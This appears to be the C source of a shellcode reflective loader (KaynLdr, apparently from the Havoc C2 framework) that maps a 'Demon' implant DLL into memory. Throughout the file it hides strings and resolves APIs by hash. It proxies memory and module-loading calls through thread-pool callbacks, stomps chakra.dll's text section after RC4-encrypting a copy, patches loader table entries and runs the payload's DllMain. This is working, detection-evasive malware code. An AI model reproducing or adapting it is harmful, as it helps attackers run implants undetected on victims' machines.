#include <Core.h>
#include <Win32.h>
#include <ntdef.h>
#include <Utils.h>
#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

LONG ExceptionHandler(
        IN OUT PEXCEPTION_POINTERS Exception
);

SEC(text, B) VOID CallbackFunctionCall(PINSTANCE Instance, PVOID ArgsStruct){
    PTP_WORK WorkReturn = NULL;
    Instance->Win32.TpAllocWork(&WorkReturn,Instance->Callbacks.WorkCallback,ArgsStruct,NULL);
    Instance->Win32.TpPostWork(WorkReturn);
    Instance->Win32.TpReleaseWork(WorkReturn);
}

SEC( text, B ) VOID Entry( VOID )
{
    INSTANCE                Instance        = { 0 };
    WCHAR          NameW[ 20 ]   = { 0 };
    HMODULE                 KaynLibraryLdr  = NULL;
    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
    LPVOID                  KVirtualMemory  = NULL;
    PFULLLDR_DATA_TABLE_ENTRY   StompedEntry    = NULL;
    SIZE_T                   KMemSize        = 0;
    SIZE_T                   KHdrSize        = 0;
    PVOID                   SecMemory       = NULL;
    SIZE_T                   SecMemorySize   = 0;
    DWORD                   Protection      = 0;
    ULONG Characteristics = 0x0002;
    ULONG                   OldProtection   = 0;
    PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
    KAYN_ARGS               KaynArgs        = { 0 };
    PVOID                   ModuleStomped   = NULL;
    PVOID                   Kernel32Module = NULL;
    PVOID                   StompedAddress = NULL;
    SIZE_T                  StompedSize = 0;
    SIZE_T                  StompedSizeTmp = 0;
    U_STRING UnicodeString  = { 0 };
    CONTEXT           Context = { 0 };
    PBYTE DestPtr = NULL;
    PBYTE SrcPtr = NULL;
    PTP_WORK WorkReturn = NULL;
    USHORT         DestSize       = 0;
    BYTE key[KEYSIZE] = {0x9f,0x8b,0xa,0xac};
    CHAR ModuleName[ 11 ] = { 0 };
    CHAR ModuleADVAPI[13] = {0};

    ModuleName[ 0  ] = HideChar('C');
    ModuleName[ 1  ] = HideChar('H');
    ModuleName[ 2  ] = HideChar('A');
    ModuleName[ 3  ] = HideChar('K');
    ModuleName[ 4  ] = HideChar('R');
    ModuleName[ 5  ] = HideChar('A');
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 7  ] = HideChar('D');
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 10  ] = HideChar('\0');


    ModuleADVAPI[ 0  ] = HideChar('A');
    ModuleADVAPI[ 2  ] = HideChar('V');
    ModuleADVAPI[ 11 ] = HideChar('L');
    ModuleADVAPI[ 10 ] = HideChar('L');
    ModuleADVAPI[ 3  ] = HideChar('A');
    ModuleADVAPI[ 8  ] = HideChar('.');
    ModuleADVAPI[ 12 ] = HideChar('\0');
    ModuleADVAPI[ 6  ] = HideChar('3');
    ModuleADVAPI[ 7  ] = HideChar('2');
    ModuleADVAPI[ 1  ] = HideChar('D');
    ModuleADVAPI[ 9  ] = HideChar('D');
    ModuleADVAPI[ 5  ] = HideChar('I');
    ModuleADVAPI[ 4  ] = HideChar('P');

#ifdef _WIN64
    /*Set ptr to WorkCallback*/
    Instance.Callbacks.WorkCallback = (PBYTE)GetRIPCallback()+2;
#endif
     // 0. First we need to get our own image base
    KaynLibraryLdr          = KaynCaller();
    Instance.Modules.Ntdll  = LdrModulePeb( NTDLL_HASH );
    Instance.Modules.Advapi32 = LdrModulePeb(ADVAPI32_HASH);
    Instance.Win32.LdrLoadDll              = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
    Instance.Win32.NtAllocateVirtualMemory = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY );
    Instance.Win32.NtProtectVirtualMemory  = LdrFunctionAddr( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
#ifdef _WIN64
    Instance.Win32.TpAllocWork  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_TPALLOCWORK );
    Instance.Win32.TpReleaseWork  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_TPRELEASEWORK );
    Instance.Win32.TpPostWork  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_TPPOSTWORK );
#endif

#ifdef STOMPING
    ModuleStomped = (PVOID)LdrModulePeb(STOMPED_HASH);
    if(!NT_SUCCESS(ModuleStomped)) {
#ifdef _WIN64

        if(Instance.Modules.Advapi32 <= 0) {
            /* convert module ansi string to unicode string */
            CharStringToWCharString( NameW, ModuleADVAPI, StringLengthA( ModuleADVAPI ) );
            /* get size of module unicode string */
            DestSize = StringLengthW(NameW) * sizeof(WCHAR);
            UnicodeString.Buffer = NameW;
            UnicodeString.Length = DestSize;
            UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
            ModuleStomped = 0;
            Characteristics = 0x0;

            //call ldrloaddll to load advapi. Required to later get systemfunction032

            Instance.LDRLOADDLL_ARGS.pLdrLoadDll = (UINT_PTR) Instance.Win32.LdrLoadDll;
            Instance.LDRLOADDLL_ARGS.NUmberOfArgs = 4;
            Instance.LDRLOADDLL_ARGS.DllPath = NULL;
            Instance.LDRLOADDLL_ARGS.DllCharacteristics = &Characteristics; //Characteristics set to 2 in order to not call entrypoint and load as EXE
            Instance.LDRLOADDLL_ARGS.DllName = &UnicodeString;
            Instance.LDRLOADDLL_ARGS.DllHandle = &(Instance.Modules.Advapi32);
            CallbackFunctionCall(&Instance, &(Instance.LDRLOADDLL_ARGS));
            SharedSleep(2000);
        }

        //Convert module to be stomped to WCHAR
        /* convert module ansi string to unicode string */
        CharStringToWCharString( NameW, ModuleName, StringLengthA( ModuleName ) );
        /* get size of module unicode string */
        DestSize = StringLengthW(NameW) * sizeof(WCHAR);
        UnicodeString.Buffer = NameW;
        UnicodeString.Length = DestSize;
        UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
        ModuleStomped = 0;
        Characteristics = 0x2;
        //Call LdrLoadDll to load module to be stomped
        Instance.LDRLOADDLL_ARGS.pLdrLoadDll = (UINT_PTR)Instance.Win32.LdrLoadDll;
        Instance.LDRLOADDLL_ARGS.NUmberOfArgs = 4;
        Instance.LDRLOADDLL_ARGS.DllPath = NULL;
        Instance.LDRLOADDLL_ARGS.DllCharacteristics = &Characteristics; //Characteristics set to 2 in order to not call entrypoint and load as EXE
        Instance.LDRLOADDLL_ARGS.DllName = &UnicodeString;
        Instance.LDRLOADDLL_ARGS.DllHandle = &ModuleStomped;
        CallbackFunctionCall(&Instance,&(Instance.LDRLOADDLL_ARGS));
//        Instance.Win32.TpAllocWork(&WorkReturn,Instance.Callbacks.WorkCallbackFour,&(Instance.LDRLOADDLL_ARGS),NULL);
//        Instance.Win32.TpPostWork(WorkReturn);
//        Instance.Win32.TpReleaseWork(WorkReturn);
        SharedSleep(2000);

#else
        /* convert module ansi string to unicode string */
        CharStringToWCharString( NameW, ModuleADVAPI, StringLengthA( ModuleADVAPI ) );
        /* get size of module unicode string */
        DestSize = StringLengthW(NameW) * sizeof(WCHAR);
        UnicodeString.Buffer = NameW;
        UnicodeString.Length = DestSize;
        UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
        ModuleStomped = 0;
        Characteristics = 0x0;
        Instance.Win32.LdrLoadDll(NULL,&Characteristics,&UnicodeString,&(Instance.Modules.Advapi32));

        //Convert module to be stomped to WCHAR
        /* convert module ansi string to unicode string */
        CharStringToWCharString( NameW, ModuleName, StringLengthA( ModuleName ) );
        /* get size of module unicode string */
        DestSize = StringLengthW(NameW) * sizeof(WCHAR);
        UnicodeString.Buffer = NameW;
        UnicodeString.Length = DestSize;
        UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );
        ModuleStomped = 0;
        Characteristics = 0x2;
        Instance.Win32.LdrLoadDll(NULL,&Characteristics,&UnicodeString,&(Instance.Modules.Advapi32));
#endif

        if (ModuleStomped != 0) {
            StompedEntry = LdrModulePebDTE(STOMPED_HASH);
#ifdef _WIN64
            *(PULONG)((PBYTE)StompedEntry + 0x68) = 0xca2cc; //sets StompedEntry->DontCallForThreads = 1; StompedEntry->Flags = 0xca2cc -> this instruction got translated to rax+0x5c don't know why
            //StompedEntry->Flags = 0xca2cc; //sets StompedEntry->DontCallForThreads = 1
#else
            *(PULONG)((PBYTE)StompedEntry + 0x34) = 0xca2cc; //sets StompedEntry->DontCallForThreads = 1;
#endif
            NtHeaders = C_PTR(ModuleStomped + ((PIMAGE_DOS_HEADER) ModuleStomped)->e_lfanew);
#ifdef _WIN64
            *(PDWORD64)((PBYTE)StompedEntry + 0x38) = (DWORD64)((PBYTE)ModuleStomped + NtHeaders->OptionalHeader.AddressOfEntryPoint); //sets entrypoint
#else
            *(PDWORD32)((PBYTE)StompedEntry + 0x1c) = (DWORD32)((PBYTE)ModuleStomped + NtHeaders->OptionalHeader.AddressOfEntryPoint); //sets entrypoint

#endif
            SecHeader = IMAGE_FIRST_SECTION(NtHeaders);
            for (DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
                //SecMemory = C_PTR( ModuleStomped + SecHeader[ i ].VirtualAddress );
                if (IsText(&SecHeader[i])) {
                    KVirtualMemory = C_PTR(ModuleStomped + SecHeader[i].VirtualAddress);
                    SecMemorySize = SecHeader[i].SizeOfRawData;
                    StompedSize = SecMemorySize + KEYSIZE;
                    break;
                }
            }
        }
    }else{
        NtHeaders = C_PTR(ModuleStomped + ((PIMAGE_DOS_HEADER) ModuleStomped)->e_lfanew);
        SecHeader = IMAGE_FIRST_SECTION(NtHeaders);
        for (DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
            //SecMemory = C_PTR( ModuleStomped + SecHeader[ i ].VirtualAddress );
            if (IsText(&SecHeader[i])) {
                KVirtualMemory = C_PTR(ModuleStomped + SecHeader[i].VirtualAddress);
                SecMemorySize = SecHeader[i].SizeOfRawData;
                StompedSize = SecMemorySize + KEYSIZE;
                break;
            }
        }
    }
    //allocating RW region for stomped text section
#ifdef _WIN64
    StompedSizeTmp = StompedSize;
    Instance.NTALLOCATEVIRTUALMEMORYARGS.pNtAllocateVirtualMemory = (UINT_PTR)Instance.Win32.NtAllocateVirtualMemory;
    Instance.NTALLOCATEVIRTUALMEMORYARGS.NUmberOfArgs = 6;
    Instance.NTALLOCATEVIRTUALMEMORYARGS.ProcessHandle = NtCurrentProcess();
    Instance.NTALLOCATEVIRTUALMEMORYARGS.BaseAddress = &StompedAddress; //Characteristics set to 2 in order to not call entrypoint and load as EXE
    Instance.NTALLOCATEVIRTUALMEMORYARGS.ZeroBits = 0;
    Instance.NTALLOCATEVIRTUALMEMORYARGS.RegionSize = &StompedSizeTmp;
    Instance.NTALLOCATEVIRTUALMEMORYARGS.AllocationType = MEM_COMMIT;
    Instance.NTALLOCATEVIRTUALMEMORYARGS.Protect = PAGE_READWRITE;
    CallbackFunctionCall(&Instance,&(Instance.NTALLOCATEVIRTUALMEMORYARGS));
    SharedSleep(2000);
#else
    Instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(),&StompedAddress,0,&StompedSize,MEM_COMMIT,PAGE_READWRITE);
#endif
    if(StompedAddress > 0){
        //Copy stomped module text section to other location and encrypt it
        Instance.Win32.SystemFunction032 = LdrFunctionAddr( Instance.Modules.Advapi32, SYSTEMFUNCTION032 );
        DestPtr = (PBYTE)StompedAddress + KEYSIZE;
        SrcPtr = KVirtualMemory;
        if(KVirtualMemory != 0 && StompedAddress != 0 && StompedSize > 0) {
            MemCopy(DestPtr,SrcPtr,StompedSize-KEYSIZE);
            KaynArgs.Rc4StompedModule.Buffer = (PBYTE)StompedAddress+KEYSIZE;
            KaynArgs.Rc4StompedModule.Length = StompedSize - KEYSIZE;
            KaynArgs.Rc4StompedModule.MaximumLength = StompedSize -KEYSIZE;
            KaynArgs.KeyStompedModule.Buffer = StompedAddress;
            KaynArgs.KeyStompedModule.Length = KEYSIZE;
            KaynArgs.KeyStompedModule.MaximumLength = KEYSIZE;
            //MemCopy(KaynArgs.KeyStompedModule.Buffer,key,KaynArgs.KeyStompedModule.Length);
            //XOREncrypt(StompedAddress, StompedSize, key, KEYSIZE);
            Instance.Win32.SystemFunction032(&(KaynArgs.Rc4StompedModule),&(KaynArgs.KeyStompedModule));
        }
    }
#endif
    NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
    SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
    KHdrSize  = SecHeader[ 0 ].VirtualAddress;
    KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;
    Protection = PAGE_READWRITE;

    if ( KVirtualMemory != NULL){
        //allocating RW region for stomped text section
#ifdef _WIN64
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.pNtProtectVirtualMemory = (UINT_PTR)Instance.Win32.NtProtectVirtualMemory;
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.NUmberOfArgs = 5;
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.ProcessHandle = NtCurrentProcess();
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.BaseAddress = &KVirtualMemory; //Characteristics set to 2 in order to not call entrypoint and load as EXE
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.RegionSize = &KMemSize;
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.NewProtect = Protection;
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.OldProtect = &OldProtection;
        CallbackFunctionCall(&Instance,&(Instance.NTPROTECTVIRTUALMEMORY_ARGS));
        SharedSleep(2000);
#else
        Instance.Win32.NtProtectVirtualMemory(NtCurrentProcess(),&KVirtualMemory,&KMemSize,Protection,&OldProtection);
#endif
        goto MAPDLL;
    }
    else{
        //No Stomping so allocate
#ifdef _WIN64
        Instance.NTALLOCATEVIRTUALMEMORYARGS.pNtAllocateVirtualMemory = (UINT_PTR)Instance.Win32.NtAllocateVirtualMemory;
        Instance.NTALLOCATEVIRTUALMEMORYARGS.NUmberOfArgs = 6;
        Instance.NTALLOCATEVIRTUALMEMORYARGS.ProcessHandle = NtCurrentProcess();
        Instance.NTALLOCATEVIRTUALMEMORYARGS.BaseAddress = &KVirtualMemory; //Characteristics set to 2 in order to not call entrypoint and load as EXE
        Instance.NTALLOCATEVIRTUALMEMORYARGS.ZeroBits = 0;
        Instance.NTALLOCATEVIRTUALMEMORYARGS.RegionSize = &KMemSize;
        Instance.NTALLOCATEVIRTUALMEMORYARGS.AllocationType = MEM_COMMIT;
        Instance.NTALLOCATEVIRTUALMEMORYARGS.Protect = PAGE_READWRITE;
        CallbackFunctionCall(&Instance,&(Instance.NTALLOCATEVIRTUALMEMORYARGS));
        SharedSleep(2000);
#else
        Instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(),&StompedAddress,0,&StompedSize,MEM_COMMIT,PAGE_READWRITE);
#endif
        if(KVirtualMemory <= 0)
            goto FAILED;
    }
    MAPDLL:
    // TODO: find the base address of this shellcode in a better way?
    KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
    KaynArgs.DllCopy   = KaynLibraryLdr;
    KaynArgs.Demon     = KVirtualMemory;
    KaynArgs.DemonSize = KMemSize;

    for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
    {
        MemCopy(
                C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize ), // Section New Memory
                C_PTR( KaynLibraryLdr + SecHeader[ i ].PointerToRawData ),          // Section Raw Data
                SecHeader[ i ].SizeOfRawData                                        // Section Size
        );
    }
    ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
    if ( ImageDir->VirtualAddress )
        KaynLdrReloc( KVirtualMemory, (PVOID)NtHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ), KHdrSize );

    for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
    {
        SecMemory       = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize );
        SecMemorySize   = SecHeader[ i ].SizeOfRawData;
        Protection      = 0;
        OldProtection   = 0;

        if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
            Protection = PAGE_WRITECOPY;

        if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
            Protection = PAGE_READONLY;

        if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
            Protection = PAGE_READWRITE;

        if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
            Protection = PAGE_EXECUTE;

        if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
            Protection = PAGE_EXECUTE_WRITECOPY;

        if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
        {
            Protection = PAGE_EXECUTE_READ;
            KaynArgs.TxtBase = KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize;
            KaynArgs.TxtSize = SecHeader[ i ].SizeOfRawData;
        }

        if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
            Protection = PAGE_EXECUTE_READWRITE;

#ifdef _WIN64
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.pNtProtectVirtualMemory = (UINT_PTR)Instance.Win32.NtProtectVirtualMemory;
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.NUmberOfArgs = 5;
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.ProcessHandle = NtCurrentProcess();
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.BaseAddress = &SecMemory; //Characteristics set to 2 in order to not call entrypoint and load as EXE
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.RegionSize = &SecMemorySize;
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.NewProtect = Protection;
        Instance.NTPROTECTVIRTUALMEMORY_ARGS.OldProtect = &OldProtection;
        CallbackFunctionCall(&Instance,&(Instance.NTPROTECTVIRTUALMEMORY_ARGS));
        SharedSleep(2000);
#else
        Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
#endif
    }

    // --------------------------------
    // 6. Finally executing our DllMain
    // --------------------------------
    BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
    KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );

    FAILED:
    return;

}

VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize )
{
    PIMAGE_BASE_RELOCATION  pImageBR = C_PTR( BaseRelocDir - KHdrSize );
    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage - KHdrSize ) - U_PTR( ImageBase ) );
    PIMAGE_RELOC            Reloc    = NULL;

    while( pImageBR->VirtualAddress != 0 )
    {
        Reloc = ( PIMAGE_RELOC ) ( pImageBR + 1 );

        while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
        {
            if ( Reloc->type == IMAGE_REL_TYPE )
                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset - KHdrSize ) += ( ULONG_PTR ) OffsetIB;

            else if ( Reloc->type != IMAGE_REL_BASED_ABSOLUTE )
                __debugbreak(); // TODO: handle this error

            Reloc++;
        }

        pImageBR = ( PIMAGE_BASE_RELOCATION ) Reloc;
    }
}
